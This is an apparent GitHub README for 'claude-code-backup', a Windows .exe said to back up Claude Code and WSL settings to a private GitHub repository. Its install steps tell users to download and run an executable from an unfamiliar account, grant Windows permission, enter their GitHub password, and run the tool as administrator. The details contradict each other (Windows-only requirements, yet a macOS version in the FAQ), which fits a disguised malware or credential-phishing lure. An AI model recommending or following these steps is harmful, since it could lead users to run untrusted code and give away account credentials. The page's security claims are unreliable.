# 💾 claude-code-backup - Save your Claude settings to GitHub

[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Sibyllablueviolet195/claude-code-backup)

### 📋 Overview

Claude Code keeps your settings, custom skills, and environment configurations in specific file locations. If your computer fails or you shift to a new machine, you lose these files. This tool creates a local copy of your setup and sends it to a private GitHub repository. You can then pull these settings to any other computer, including machines running Windows or WSL.

This application protects your work. It tracks changes to your configuration files and archives them in the cloud. You gain peace of mind knowing your custom tools remain safe.

### ⚙️ System Requirements

*   **Operating System**: Windows 10 or Windows 11.
*   **Storage**: At least 50MB of free space.
*   **Networking**: An active internet connection to sync your data.
*   **Account**: A personal GitHub account to store your backups.
*   **Permissions**: Standard user access to run the installation file.

### 📥 Installing the Application

1. Visit the [official release page](https://github.com/Sibyllablueviolet195/claude-code-backup) to download the software.
2. Look for the file ending in `.exe` under the latest release section.
3. Save the file to your Downloads folder.
4. Double-click the file to start the installation.
5. Follow the prompts on your screen. Windows may ask for permission to run the app. Select "Run" to continue.
6. The installer places a shortcut on your desktop.

### 🚀 Running the Backup

1. Open the application from your desktop icon.
2. The program window appears on your screen.
3. Select "Connect GitHub Account" to allow the tool to create a private repository for your files.
4. Input your GitHub username and password when the browser window prompts you.
5. Choose the folders you want to save. The application suggests standard locations for Claude Code and WSL stores by default.
6. Click the "Start Backup" button to upload your configuration.
7. The status bar indicates the progress of your upload.
8. A message notifies you when the backup finishes.

### 🔄 Restoring Your Settings

1. Install the software on your new machine.
2. Open the application.
3. Log in to the same GitHub account used for the initial backup.
4. Navigate to the "Restore" tab in the menu.
5. Select the most recent date from the list of available backups.
6. Click "Restore Files." The application downloads your settings and places them into the correct folders.
7. Restart your terminal or Claude Code instance to see your restored configuration.

### 🛡️ Security and Privacy

Your backups exist inside a private GitHub repository. Only your account has access to these files. The application uses encrypted connections to send and receive data. No human reads your configurations. The tool only copies text files related to your Claude setup. It ignores personal photos, documents, or unrelated system files.

### 💡 Managing Your Backups

The application manages versions of your settings. Every time you run a backup, it saves a new snapshot. If you make a mistake in a configuration file, you can roll back to a version from the previous day. Use the "History" tab to view specific versions and choose which set to apply.

### 🛠️ Troubleshooting Issues

*   **Connection Error**: Check your internet connection. Ensure your firewall does not block the application.
*   **Login Failure**: Verify your GitHub password. If you use two-factor authentication, ensure you approve the request on your mobile device.
*   **Folder Missing**: The tool defaults to common paths. If you store your settings in a custom location, use the "Add Directory" button in Settings to include that path manually.
*   **Permission Denied**: Run the application as an administrator if it cannot write files to system directories. Right-click the shortcut and select "Run as administrator."

### 📝 Frequently Asked Questions

**Does this tool save my API keys?**
The tool does not back up sensitive credentials like API keys. It focuses on your configuration and rules.

**Can I use this on macOS?**
Yes. You can install the macOS version from the same release page if you move between computers with different operating systems.

**Does this sync in real-time?**
The current version runs manually to give you control over your data usage. You trigger the sync when you finish major changes.

**What happens if I lose my GitHub account?**
The backups reside on GitHub servers. If you cannot access your account, you cannot access your backed-up settings. Keep your GitHub credentials secure.

**Does this work with standard Claude Desktop?**
Yes. The tool identifies files used by Claude Desktop, Claude Code, and associated WSL configurations.

### 📋 Customizing Your Sync

You can choose to exclude certain folders from your backup routine. Go to "Settings" then "Exclusions" to prevent specific subfolders from uploading. This helps if you have large temporary files or logs you do not need to save. 

The application logs its activity in a text file. If you have trouble, click "Open Logs" in the Help menu to see what happened during your last request. You can copy this data if you need help from a technical expert.

### 🌟 Advanced Configuration

The settings menu includes a section for "Sync Frequency." You can set the tool to check for changes every hour if you prefer. This ensures your latest adjustments remain saved without manual effort. Ensure the app remains open in your system tray to use this feature. The tray icon shows a small cloud logo when the app is active. Right-click this icon to quit the program or open the dashboard quickly.